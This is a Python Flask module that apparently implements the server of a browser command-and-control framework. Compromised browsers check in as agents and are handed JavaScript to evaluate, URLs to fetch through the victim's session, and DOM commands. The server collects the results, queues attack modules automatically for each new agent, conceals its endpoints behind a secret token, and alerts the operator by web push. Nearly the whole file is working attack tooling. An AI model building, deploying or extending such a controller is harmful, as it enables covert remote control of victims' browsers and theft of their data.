import time
import json
import re
from datetime import datetime
from app import db, ConnectedAgents, ConnectedDomAgents, extraModules, AutomaticModuleExecution
from flask import jsonify, request, Blueprint, Response, render_template
from pywebpush import webpush, WebPushException
from database.models import Url, Registration, Agent, Module, DomCommand, DashboardRegistration
from config import Config

agent = Blueprint('agent', __name__)

REQUEST_TTL = 60*2 #60*60*24*100 #2 minutes

@agent.before_request
def verify_token():
    url_params = request.view_args
    token = (url_params and url_params.pop('token', None)) or None
    if token != Config.AGENT_TOKEN:
        return Response("", 404)

@agent.after_request
def apply_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type,User-Agent"
    return response

@agent.route('/get')
def geturl():
    ###START UI #####
    agentID = str(request.args.get('agentID'))
    if agentID is None or agentID == '':
        return Response("", 404)
        
    # avoid potential for XSS when rendered back in the dashboard
    agentID = safeParam(agentID)
    
    if agentID not in ConnectedAgents:
        ConnectedAgents[agentID] = {'first_seen': time.time(), \
                                    'domain': safeParam(request.args.get('domain')), \
                                    'port': safeParam(request.args.get('port'))}
        print("Created new agent")
    else:
        print("Existing agent")

    ConnectedAgents[agentID]['id'] = agentID    
    ConnectedAgents[agentID]['ip'] = safeParam(request.remote_addr)
    ConnectedAgents[agentID]['last_seen'] = time.time()
    ConnectedAgents[agentID]['active'] = 'true'
    ConnectedAgents[agentID]['user_agent'] = request.headers.get('User-Agent')
    
    updateAgent(agentID, ConnectedAgents[agentID])
    
    module = db.session.query(Module).filter(Module.agentId == agentID, Module.processed == 0).order_by(Module.id.desc()).first()
    if module is not None:
        module.processed = 1
        db.session.commit()
        to_eval = render_template('modules/' + module.name +'.js')
        return jsonify({'EVAL': to_eval})
        
    timestamp = datetime.fromtimestamp(int(time.time()) - REQUEST_TTL).strftime('%Y-%m-%d %H:%M:%S')
    url = db.session.query(Url).filter(Url.processed == 0, Url.time_stamp > timestamp, Url.agentId == agentID).first()

    if url is None:
        return "{}"

    myuid = url.id
    url.processed = 1
    db.session.commit()
    results = {}
    results['ID'] = myuid
    results['URL'] = url.url
    results['Request'] = json.loads(url.request)
    return jsonify(results)
    
@agent.route('/put/<uuid>', methods = ['POST'])
def addData(uuid):
    content = request.get_json(silent = True)
    if content == None:
        print("CONTENT NONE")
        return Response("", 404)
    if 'DATA' in content.keys():
        print("--rcv-->" + uuid)
        url = db.session.query(Url).filter(Url.id == uuid).first()
        if url is None:
            return Response("", 404)
        url.response = request.data
        db.session.commit()
        return "commited"
    print("NO DATA in POST")
    return Response("", 404)
    
@agent.route('/dom')
def domGetCommand():
    agentID = str(request.args.get('agentID'))
    if agentID is None or agentID == '':
        return Response("", 404)
    if agentID not in ConnectedDomAgents:
        ConnectedDomAgents[agentID] = {'first_seen': time.time()}
    ConnectedDomAgents[agentID]['id'] = agentID
    ConnectedDomAgents[agentID]['ip'] = safeParam(request.remote_addr)
    ConnectedDomAgents[agentID]['last_seen'] = time.time()
    dom_command = db.session.query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 0).first()
    res = {}
    if dom_command is not None:
        dom_command.processed = 1
        db.session.commit()
        res['id'] = dom_command.id
        res['command'] = dom_command.command
    return jsonify(res)

@agent.route('/dom/<agent_id>/<dom_command_id>', methods = ['POST'])
def domResult(agent_id, dom_command_id):
    body = request.get_json(silent = True)
    if body and body['result']:
        dom_command = db.session.query(DomCommand).filter(DomCommand.agentId == agent_id, DomCommand.id == dom_command_id, DomCommand.processed == 1).first()
        if dom_command is not None:
            dom_command.result = body['result']
            db.session.commit()
            return jsonify({'id': dom_command.id})
    return Response("", 404)

@agent.route('/registration', methods = ['POST'])
def registration():
    body = request.get_json(silent = True)
    if body and body['endpoint'] and body['key'] and body['authSecret'] and body['agentID']:
        registration = Registration(None, body['endpoint'], body['key'], body['authSecret'], body['agentID'])
        db.session.add(registration)
        db.session.commit()
        return ""
    return Response("", 404)

@agent.route('/module/<moduleName>/<agentID>', methods = ['POST'])
def saveModuleData(moduleName, agentID):
    if moduleName not in extraModules['modules']:
        return Response("", 404)
    module = db.session().query(Module).filter(Module.agentId == agentID, Module.name == moduleName, Module.processed == 1).first()
    if module is None:
        return Response("", 404)
    if 'result' not in request.form:
        return Response("", 404)
    module.results = module.results + request.form['result']
    db.session().commit()
    return ""

def updateAgent(agentID, params):
    now = datetime.now()
    agent = db.session().query(Agent).filter(Agent.id == agentID).first()
    if agent is None:
        agent = Agent(agentID, now, now, params['domain'], params['port'], params['ip'], params['user_agent'])
        db.session.add(agent)
        addModulesToNewAgent(agent)
        db.session.commit()
        notifyNewAgent()
    else:
        agent.last_seen = now
        agent.ip = params['ip']
        if agent.user_agent !=  params['user_agent']: #update user agent only if it changes
            agent.user_agent = params['user_agent']
        db.session.commit()

def safeParam(param):
    return ''.join(re.findall(r'(\w+|-|\.)', param))

# Auto load selected modules against new agents
def addModulesToNewAgent(agent):
    for extraModule in AutomaticModuleExecution:
        module = Module(None, agent.id, extraModule, '', 0, datetime.now())
        db.session().add(module)
        
def notifyNewAgent():
    dashboard_notifications = db.session.query(DashboardRegistration).all()
    if dashboard_notifications is not None:
        for registration in dashboard_notifications:
            try:
               webpush(
                   subscription_info={
                    "endpoint": registration.endpoint,
                    "keys": {
                      "p256dh": registration.authKey,
                      "auth": registration.authSecret
                     }
                   },
                   data="",
                   vapid_private_key="./private_key.pem",
                   vapid_claims={
                    "sub": "mailto:YourNameHere@example.org",
                   }
               )
            except WebPushException as ex:
                print(ex)
                return
    return